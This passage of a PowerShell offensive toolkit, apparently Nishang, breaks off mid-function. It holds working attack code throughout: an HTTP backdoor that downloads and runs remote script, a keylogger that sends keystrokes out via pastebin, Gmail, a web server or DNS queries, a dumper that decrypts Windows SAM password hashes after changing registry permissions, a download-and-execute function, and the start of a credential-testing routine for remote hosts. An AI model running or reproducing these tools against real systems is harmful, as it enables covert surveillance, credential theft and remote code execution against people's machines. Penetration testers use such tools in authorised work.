The URL which the payload would query for instructions.

.PARAMETER PayloadURL
The URL from where the powershell script would be downloaded.

.PARAMETER Arguments
Arguments to be passed to a script. Powerpreter and other scripts in Nishang need the function name and arguments here.

.PARAMETER MagicString
The string which would act as an instruction to the payload to proceed with download and execute.

.PARAMETER StopString
The string which if found at CheckURL will stop the payload.

.Example

PS > HTTP-Backdoor

The payload will ask for all required options.

.EXAMPLE
PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis

Use above when using the payload from non-interactive shells.

.EXAMPLE
PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis | Do-Exfiltration -ExfilOption DNS -DomainName example.com -AuthNS 192.168.254.228

Use above command for data exfiltration to a DNS server which logs TXT queries.


.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $CheckURL,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments = "Out-Null",

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $MagicString,

        [Parameter(Position = 4, Mandatory = $True)]
        [String]
        $StopString
    )

   while($true)
    {
        $exec = 0
        start-sleep -seconds 5
        $webclient = New-Object System.Net.WebClient
        $filecontent = $webclient.DownloadString("$CheckURL")
        if($filecontent -eq $MagicString)
        {
            $pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
            # Check for arguments to the downloaded script.
            if ($Arguments -ne "Out-Null")
            {
                $pastevalue = Invoke-Expression $Arguments                   
            }
            $pastevalue
            $exec++
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }
        }
        elseif ($filecontent -eq $StopString)
        {
            break
        }
    }
    
}

#############################################Logs the keys in the context of current user.#################################################
function Keylogger
{

<#
.SYNOPSIS
Payload which logs keys.

.DESCRIPTION
This payload logs a user's keys and writes them to file key.log (I know its bad :|) in user's temp directory.
Saved keys could then be decoded using the Parse_Key script.

.PARAMETER CheckURL
The URL which would contain the MagicString used to stop keylogging.

.PARAMETER MagicString
The string which when found at CheckURL will stop the keylogger.

.EXAMPLE
PS > Keylogger
The payload will ask for all required options.

.EXAMPLE
PS > Keylogger http://example.com stopthis
Use above when using the payload from non-interactive shells or you don't want the payload to ask for any options.

.EXAMPLE
PS > Keylogger http://example.com stopthis -exfil <dev_key> <username> <pass> 2 
Use above when using the payload from non-interactive shells. This will exfiltrate keys to gmail.


.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>
    
    [CmdletBinding(DefaultParameterSetName="noexfil")] Param( 
        [Parameter(Parametersetname="exfil")]
        [Switch]
        $persist,

        [Parameter(Parametersetname="exfil")]
        [Switch]
        $exfil,

        [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $CheckURL,

        [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $MagicString,

        [Parameter(Position = 2, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
        [String]
        $ExfilOption,

        [Parameter(Position = 3, Mandatory = $False, Parametersetname="exfil")] 
        [String]
        $dev_key = "null",

        [Parameter(Position = 4, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $username = "null",

        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $password = "null",

        [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $URL = "null",
      
        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $DomainName = "null",

        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $AuthNS = "null"   
   
    )

$functions =  {

function Keylog
{
    Param ( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $MagicString,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $CheckURL
    )
    
    $signature = @" 
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
"@ 
    $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru 
    $check = 0
    while ($true) 
    { 
        Start-Sleep -Milliseconds 40 
        $logged = "" 
        $result="" 
        $shift_state="" 
        $caps_state="" 
        for ($char=1;$char -le 254;$char++) 
        { 
            $vkey = $char 
            $logged = $getKeyState::GetAsyncKeyState($vkey) 
            if ($logged -eq -32767) 
            { 
                if(($vkey -ge 48) -and ($vkey -le 57)) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                        if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                        { 
                            $result = "S-" + $vkey 
                        } 
                        else 
                        { 
                            $result = $vkey 
                        } 
                    } 
                elseif(($vkey -ge 64) -and ($vkey -le 90)) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                    $caps_state = [console]::CapsLock 
                    if(!(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) -xor $caps_state) 
                    { 
                        $result = "S-" + $vkey 
                    } 
                    else 
                    { 
                        $result = $vkey 
                    } 
                } 
                elseif((($vkey -ge 186) -and ($vkey -le 192)) -or (($vkey -ge 219) -and ($vkey -le 222))) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                    if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                    { 
                        $result = "S-" + $vkey 
                    } 
                    else 
                    { 
                      $result = $vkey 
                    } 
                } 
                else 
                { 
                    $result = $vkey 
                } 
                $now = Get-Date; 
                $logLine = "$result " 
                $filename = "$env:temp\key.log" 
                Out-File -FilePath $fileName -Append -InputObject "$logLine" 

            }
        }
        $check++
        if ($check -eq 6000)
        {
            $webclient = New-Object System.Net.WebClient
            $filecontent = $webclient.DownloadString("$CheckURL")
            if ($filecontent -eq $MagicString)
            {
                break
            }
            $check = 0
        }
    }
}


    function Keypaste
    {
        Param ( 
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $ExfilOption,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [String]
            $dev_key,
        
            [Parameter(Position = 2, Mandatory = $True)]
            [String]
            $username,

            [Parameter(Position = 3, Mandatory = $True)]
            [String]
            $password,
        
            [Parameter(Position = 4, Mandatory = $True)]
            [String]
            $URL,

            [Parameter(Position = 5, Mandatory = $True)]
            [String]
            $AuthNS,

            [Parameter(Position = 6, Mandatory = $True)]
            [String]
            $MagicString,
        
            [Parameter(Position = 7, Mandatory = $True)]
            [String]
            $CheckURL
        )

        $check = 0
        while($true) 
        { 
            $read = 0
            Start-Sleep -Seconds 5 
            $pastevalue=Get-Content $env:temp\key.log 
            $read++
            if ($read -eq 30)
            {
                Out-File -FilePath $env:temp\key.log -Force -InputObject " " 
                $read = 0
            }
            $now = Get-Date; 
            $name = $env:COMPUTERNAME 
            $paste_name = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
            function post_http($url,$parameters) 
            { 
                $http_request = New-Object -ComObject Msxml2.XMLHTTP 
                $http_request.open("POST", $url, $false) 
                $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
                $http_request.setRequestHeader("Content-length", $parameters.length); 
                $http_request.setRequestHeader("Connection", "close") 
                $http_request.send($parameters) 
                $script:session_key=$http_request.responseText 
            } 

            function Compress-Encode
            {
                #Compression logic from http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
                $encdata = [string]::Join("`n", $pastevalue)
                $ms = New-Object System.IO.MemoryStream
                $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
                $sw = New-Object System.IO.StreamWriter($cs)
                $sw.Write($encdata)
                $sw.Close();
                $Compressed = [Convert]::ToBase64String($ms.ToArray())
                $Compressed
            }

            if ($exfiloption -eq "pastebin")
            {
                $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
                $pastevalue = [System.Convert]::ToBase64String($utfbytes)
                post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
                post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
            }
        
            elseif ($exfiloption -eq "gmail")
            {
                #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
                $smtpserver = "smtp.gmail.com"
                $msg = new-object Net.Mail.MailMessage
                $smtp = new-object Net.Mail.SmtpClient($smtpServer )
                $smtp.EnableSsl = $True
                $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password"); 
                $msg.From = "$username@gmail.com"
                $msg.To.Add("$username@gmail.com")
                $msg.Subject = $pastename
                $msg.Body = $pastevalue
                if ($filename)
                {
                    $att = new-object Net.Mail.Attachment($filename)
                    $msg.Attachments.Add($att)
                }
                $smtp.Send($msg)
            }

            elseif ($exfiloption -eq "webserver")
            {
                $Data = Compress-Encode
                post_http $URL $Data
            }
            elseif ($ExfilOption -eq "DNS")
            {
                $code = Compress-Encode
                $lengthofsubstr = 0
                $queries = [int]($code.Length/63)
                while ($queries -ne 0)
                {
                    $querystring = $code.Substring($lengthofsubstr,63)
                    Invoke-Expression "nslookup -querytype=txt $querystring.$DomaName $AuthNS"
                    $lengthofsubstr += 63
                    $queries -= 1
                }
                $mod = $code.Length%63
                $query = $code.Substring($code.Length - $mod, $mod)
                Invoke-Expression "nslookup -querytype=txt $query.$DomainName $AuthNS"

            }

            $check++
            if ($check -eq 6000)
            {
                $check = 0
                $webclient = New-Object System.Net.WebClient
                $filecontent = $webclient.DownloadString("$CheckURL")
                if ($filecontent -eq $MagicString)
                {
                    break
                }
            }
        }
    }
}

        if ($exfil -eq $True)
        {
            start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5] $args[6] $args[7]} -ArgumentList @($ExfilOption,$dev_key,$username,$password,$URL,$AuthNS,$MagicString,$CheckURL)
            start-job -InitializationScript $functions -scriptblock {Keylog $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
        }
        else
        {
            start-job -InitializationScript $functions -scriptblock {Keylog $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
        }
}


##########################################################Dump windows password hashes######################################
###Thanks David Kennedy###
###powerdump.rb from msf
function Get-PassHashes { 
<# 
.SYNOPSIS 
Nishang payload which dumps password hashes. 
 
.DESCRIPTION 
The payload dumps password hashes using the modified powerdump script from MSF. Administrator privileges are required for this script
(but not SYSTEM privs as for the original powerdump)

.EXAMPLE 
PS > Get-PassHashes
 
.LINK 
http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
https://github.com/samratashok/nishang

#> 
[CmdletBinding()]
Param ()


#######################################powerdump written by David Kennedy#########################################
function LoadApi
{
    $oldErrorAction = $global:ErrorActionPreference;
    $global:ErrorActionPreference = "SilentlyContinue";
    $test = [PowerDump.Native];
    $global:ErrorActionPreference = $oldErrorAction;
    if ($test)
    {
        # already loaded
        return;
     }

$code = @'
using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerDump
{
    public class Native
    {
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
     public static extern int RegOpenKeyEx(
        int hKey,
        string subKey,
        int ulOptions,
        int samDesired,
        out int hkResult);

    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
    extern public static int RegEnumKeyEx(
        int hkey,
        int index,
        StringBuilder lpName,
        ref int lpcbName,
        int reserved,
        StringBuilder lpClass,
        ref int lpcbClass,
        out long lpftLastWriteTime);

    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    extern public static int RegQueryInfoKey(
        int hkey,
        StringBuilder lpClass,
        ref int lpcbClass,
        int lpReserved,
        out int lpcSubKeys,
        out int lpcbMaxSubKeyLen,
        out int lpcbMaxClassLen,
        out int lpcValues,
        out int lpcbMaxValueNameLen,
        out int lpcbMaxValueLen,
        out int lpcbSecurityDescriptor,
        IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(
        int hKey);

        }
    } // end namespace PowerDump

    public class Shift {
        public static int   Right(int x,   int count) { return x >> count; }
        public static uint  Right(uint x,  int count) { return x >> count; }
        public static long  Right(long x,  int count) { return x >> count; }
        public static ulong Right(ulong x, int count) { return x >> count; }
        public static int    Left(int x,   int count) { return x << count; }
        public static uint   Left(uint x,  int count) { return x << count; }
        public static long   Left(long x,  int count) { return x << count; }
        public static ulong  Left(ulong x, int count) { return x << count; }
    }
'@

   $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
   $dllName = [PsObject].Assembly.Location
   $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
   $assemblies = @("System.dll", $dllName)
   $compilerParameters.ReferencedAssemblies.AddRange($assemblies)
   $compilerParameters.GenerateInMemory = $true
   $compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code)
   if($compilerResults.Errors.Count -gt 0) {
     $compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) }
   }

}

$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
$odd_parity = @(
  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
);

function sid_to_key($sid)
{
    $s1 = @();
    $s1 += [char]($sid -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,8) -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,16) -band 0xFF);
    $s1 += [char]([Shift]::Right($sid,24) -band 0xFF);
    $s1 += $s1[0];
    $s1 += $s1[1];
    $s1 += $s1[2];
    $s2 = @();
    $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
    $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
    return ,((str_to_key $s1),(str_to_key $s2));
}

function str_to_key($s)
{
    $key = @();
    $key += [Shift]::Right([int]($s[0]), 1 );
    $key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2);
    $key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3);
    $key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4);
    $key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5);
    $key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6);
    $key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7);
    $key += $([int]($s[6]) -band 0x7F);
    0..7 | %{
        $key[$_] = [Shift]::Left($key[$_], 1);
        $key[$_] = $odd_parity[$key[$_]];
        }
    return ,$key;
}

function NewRC4([byte[]]$key)
{
    return new-object Object |
    Add-Member NoteProperty key $key -PassThru |
    Add-Member NoteProperty S $null -PassThru |
    Add-Member ScriptMethod init {
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    } -PassThru |
    Add-Member ScriptMethod "encrypt" {
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    } -PassThru
}

function des_encrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $true)
}

function des_decrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $false)
}

function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
{
    $des = new-object Security.Cryptography.DESCryptoServiceProvider;
    $des.Mode = [Security.Cryptography.CipherMode]::ECB;
    $des.Padding = [Security.Cryptography.PaddingMode]::None;
    $des.Key = $key;
    $des.IV = $key;
    $transform = $null;
    if ($doEncrypt) {$transform = $des.CreateEncryptor();}
    else{$transform = $des.CreateDecryptor();}
    $result = $transform.TransformFinalBlock($data, 0, $data.Length);
    return ,$result;
}

function Get-RegKeyClass([string]$key, [string]$subkey)
{
    switch ($Key) {
        "HKCR" { $nKey = 0x80000000} #HK Classes Root
        "HKCU" { $nKey = 0x80000001} #HK Current User
        "HKLM" { $nKey = 0x80000002} #HK Local Machine
        "HKU"  { $nKey = 0x80000003} #HK Users
        "HKCC" { $nKey = 0x80000005} #HK Current Config
        default {
            throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
        }
    }
    $KEYQUERYVALUE = 0x1;
    $KEYREAD = 0x19;
    $KEYALLACCESS = 0x3F;
    $result = "";
    [int]$hkey=0
    if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
    {
    	$classVal = New-Object Text.Stringbuilder 1024
    	[int]$len = 1024
    	if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
    		[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
    	{
    		$result = $classVal.ToString()
    	}
    	else
    	{
    		Write-Error "RegQueryInfoKey failed";
    	}
    	[PowerDump.Native]::RegCloseKey($hkey) | Out-Null
    }
    else
    {
    	Write-Error "Cannot open key";
    }
    return $result;
}

function Get-BootKey
{
    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
    $b = new-object byte[] $($s.Length/2);
    0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
    $b2 = new-object byte[] 16;
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
    return ,$b2;
}

function Get-HBootKey
{
    param([byte[]]$bootkey);
    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
    $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
    if (-not $k) {return $null}
    [byte[]]$F = $k.GetValue("F");
    if (-not $F) {return $null}
    $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
    $rc4 = NewRC4 $rc4key;
    return ,($rc4.encrypt($F[0x80..0x9F]));
}

function Get-UserName([byte[]]$V)
{
    if (-not $V) {return $null};
    $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
    $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
    return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
}

function Get-UserHashes($u, [byte[]]$hbootkey)
{
    [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
    
    # check if hashes exist (if byte memory equals to 20, then we've got a hash)
    $LM_exists = $false;
    $NT_exists = $false;
    # LM header check
    if ($u.V[0xa0..0xa3] -eq 20)
    {
        $LM_exists = $true;
    }
    # NT header check
    elseif ($u.V[0xac..0xaf] -eq 20)
    {
        $NT_exists = $true;
    }

    if ($LM_exists -eq $true)
    {
        $lm_hash_offset = $u.HashOffset + 4;
        $nt_hash_offset = $u.HashOffset + 8 + 0x10;
        $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
        $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
	
    elseif ($NT_exists -eq $true)
    {
        $nt_hash_offset = $u.HashOffset + 8;
        $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
}

function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
{
    [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
    # LM Hash
    if ($enc_lm_hash)
    {
        $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
    }

    # NT Hash
    if ($enc_nt_hash)
    {
        $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
    }

    return ,($lmhash,$nthash)
}

function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
{
    $deskeys = sid_to_key $rid;
    $md5 = [Security.Cryptography.MD5]::Create();
    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
    $rc4 = NewRC4 $rc4_key;
    $obfkey = $rc4.encrypt($enc_hash);
    $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
        (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
    return ,$hash;
}

function Get-UserKeys
{
    ls HKLM:\SAM\SAM\Domains\Account\Users |
        where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
            Add-Member AliasProperty KeyName PSChildName -PassThru |
            Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
            Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
}

function DumpHashes
{
    LoadApi
    $bootkey = Get-BootKey;
    $hbootKey = Get-HBootKey $bootkey;
    Get-UserKeys | %{
        $hashes = Get-UserHashes $_ $hBootKey;
        "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
    }
}

    #http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Write-Warning "Script requires elevated or administrative privileges."
        Return
    } 
    else
    {
        #Set permissions for the current user.
        $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
        "FullControl",
        [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
        [System.Security.AccessControl.PropagationFlags]"None",
        [System.Security.AccessControl.AccessControlType]"Allow")
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
        "SAM\SAM\Domains",
        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
        [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        $acl = $key.GetAccessControl()
        $acl.SetAccessRule($rule)
        $key.SetAccessControl($acl)

        DumpHashes

        #Remove the permissions added above.
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
        Set-Acl HKLM:\SAM\SAM\Domains $acl

    }
}



####################################Download and Execute a powershell script#########################################################



function Download-Execute-PS
{
<#
.SYNOPSIS
Nishang script which downloads and executes a powershell script.

.DESCRIPTION
This payload downloads a powershell script from specified URL and then executes it on the target.

.PARAMETER ScriptURL
The URL from where the powershell script would be downloaded.

.PARAMETER Arguments
The Arguments to pass to the script when it is not downloaded to disk i.e. with -nodownload function.
This is to be used when the scripts load a function in memory, true for most scripts in Nishang.

.PARAMETER Nodownload
If this switch is used, the script is not dowloaded to the disk.

.EXAMPLE
PS > Download-Execute-PS http://pastebin.com/raw.php?i=jqP2vJ3x

.EXAMPLE
PS > Download-Execute-PS http://script.alteredsecurity.com/evilscript.ps1 -Argument evilscript -nodownload
The above command does not download the script file to disk and executes the evilscript function inside the evilscript.ps1

.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ScriptURL,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $Arguments,

        [Switch]
        $nodownload
    )

    if ($nodownload -eq $true)
    {
        Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"))
        if($Arguments)
        {
            Invoke-Expression $Arguments
        }
    }
    
    else
    {
        $webclient = New-Object System.Net.WebClient
        $file1 = "$env:temp\deps.ps1"
        $webclient.DownloadFile($ScriptURL,"$file1")
        $script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $file1
        $pastevalue
    }
}



#####################################Check credentials on remote computers and create sessions#########################################################

function Create-MultipleSessions
{
    
<#
.SYNOPSIS
Function which can check for credentials on remote computers and can open PSSessions if the credentials work.

.DESCRIPTION
The payload uses WMI to check a credential against given list of computers. Use the -Creds parameter to specify username and password. If the script is run
from a powershell session with local or global admin credentials (or from a powershell session started with hashes of such account using WCE), it should be used
without the -Creds parameter. Use the -CreateSessions parameter to create PSSessions. 

.PARAMETER filename
Path to the file which stores list of servers.

.PARAMETER Creds
Use this parameter to specify username (in form of domain\username) and password.

.PARAMETER CreateSessions
Use this parameter to make the script create PSSessions to targets on which the credentials worked.

.PARAMETER VerboseErrors
Use this parameter to get verbose error messages.

.EXAMPLE
PS > Create-MultipleSessions -filename .\servers.txt
Above command uses the credentials available with current powershell session and checks it against multiple computers specified in servers.txt

.EXAMPLE
PS > Create-MultipleSessions -filename .\servers.txt -Creds
Above command asks the user to provide username and passowrd to check on remote computers.

.EXAMPLE
PS > Create-MultipleSessions -filename .\servers.txt -CreateSessions
Above command uses the credentials available with current powershell session, checks it against multiple computers specified in servers.txt and creates PSSession for those.

.LINK
http://labofapenetrationtester.com/2013/04/poshing-the-hashes.html
https://github.com/samratashok/nishang
#>

    [CmdletBinding()] Param ( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $filename,

        [Parameter(Mandatory = $False)]
        [Switch]
        $Creds,
    
        [Parameter(Mandatory = $False)]
        [Switch]
        $CreateSessions,

        [Parameter(Mandatory = $False)]
        [Switch]
        $VerboseErrors
    )
    $ErrorActionPreference = "SilentlyContinue"
    if ($VerboseErrors)
    {
        $ErrorActionPreference = "Continue"
    }
    $servers = Get-Content $filename

    if ($Creds)
    {
        $Credentials = Get-Credential
        $CheckCommand = 'gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True" -ComputerName $server -Credential $Credentials'
